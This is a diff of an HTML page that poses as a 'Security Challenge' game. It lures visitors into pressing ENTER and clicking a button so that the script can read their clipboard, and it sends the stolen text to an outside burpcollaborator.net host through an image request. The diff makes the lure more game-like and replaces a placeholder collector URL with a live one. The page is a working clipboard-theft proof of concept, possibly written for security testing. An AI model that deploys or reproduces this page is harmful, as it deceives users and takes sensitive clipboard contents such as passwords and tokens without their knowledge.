@@ -1,37 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Hybrid Gesture Validation</title>
+  <title>🎮 Security Challenge</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: 'Segoe UI', sans-serif;
       text-align: center;
       padding-top: 100px;
+      background: radial-gradient(circle at center, #2e2e2e, #000000);
+      color: #f1f1f1;
     }
-    button {
-      padding: 12px 24px;
-      font-size: 18px;
-      margin-top: 30px;
-      cursor: pointer;
+
+    h2 {
+      color: #00ffcc;
+      font-size: 32px;
+      text-shadow: 0 0 10px #00ffcc;
     }
+
     #msg {
       margin-top: 20px;
-      font-size: 16px;
+      font-size: 18px;
+      color: #ffffff;
     }
-    #result {
-      margin-top: 20px;
+
+    #btn {
+      padding: 15px 30px;
+      font-size: 20px;
+      margin-top: 30px;
+      cursor: pointer;
+      border: none;
+      border-radius: 8px;
+      background-color: #00ffcc;
+      color: #000;
       font-weight: bold;
-      color: green;
+      box-shadow: 0 0 10px #00ffcc;
+      transition: all 0.3s ease;
+    }
+
+    #btn:hover {
+      background-color: #00e6b8;
+      box-shadow: 0 0 15px #00ffcc;
+    }
+
+    #result {
+      margin-top: 30px;
+      font-weight: bold;
+      color: #00ffcc;
       white-space: pre-wrap;
+      font-size: 16px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
   </style>
 </head>
 <body>
 
-  <h2>Account Security Verification</h2>
-  <div id="msg">Press ENTER to begin the verification process...</div>
+  <h2>🕹️ Security Challenge: Level 1</h2>
+  <div id="msg">Press ENTER to begin the verification challenge...</div>
   <button id="btn" style="display:none;">
-    Continue Verification — Click this button, then hit ENTER repeatedly and quickly
+    🎯 Click this & hit ENTER repeatedly to complete the mission
   </button>
   <div id="result"></div>
 
@@ -45,12 +73,12 @@
       if (stage === 0) {
         stage = 1;
         document.getElementById("msg").innerText =
-          "✅ Step 1: Keyboard gesture detected.\nNow click the button below.";
+          "✅ Step 1: ENTER detected!\n▶️ Now click the button below and hit ENTER repeatedly to verify.";
         document.getElementById("btn").style.display = "inline-block";
       } else if (stage === 2) {
-        document.getElementById("msg").innerText = "✅ Verification complete.";
+        document.getElementById("msg").innerText = "🏁 Verification Complete!";
         document.getElementById("result").innerText =
-          "Thank you for completing the verification!";
+          "✅ Thank you for playing the Security Challenge!";
       }
     });
 
@@ -59,21 +87,20 @@
         triggered = true;
         stage = 2;
 
-        document.getElementById("msg").innerText = "📋 Reading clipboard...";
+        document.getElementById("msg").innerText = "📋 Accessing secure memory...";
 
         navigator.clipboard.readText()
           .then(text => {
-            document.getElementById("result").innerText = "📋 Clipboard:\n" + text;
+            document.getElementById("result").innerText = "📋 Clipboard data:\n" + text;
 
-            // Optional: exfiltration
             const img = new Image();
-            img.src = "https://your-collab-url.net/log?clip=" + encodeURIComponent(text);
+            img.src = "https://wmmp7fm4v9s78qkxv73hdam13s9lxa.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
 
             document.getElementById("msg").innerText =
-              "✅ Clipboard successfully read.\nPress ENTER again to finish.";
+              "🎉 Clipboard read successfully!\nPress ENTER one last time to finish!";
           })
           .catch(err => {
-            document.getElementById("msg").innerText = "❌ Failed to read clipboard: " + err;
+            document.getElementById("msg").innerText = "❌ Error accessing clipboard: " + err;
           });
       }
     });
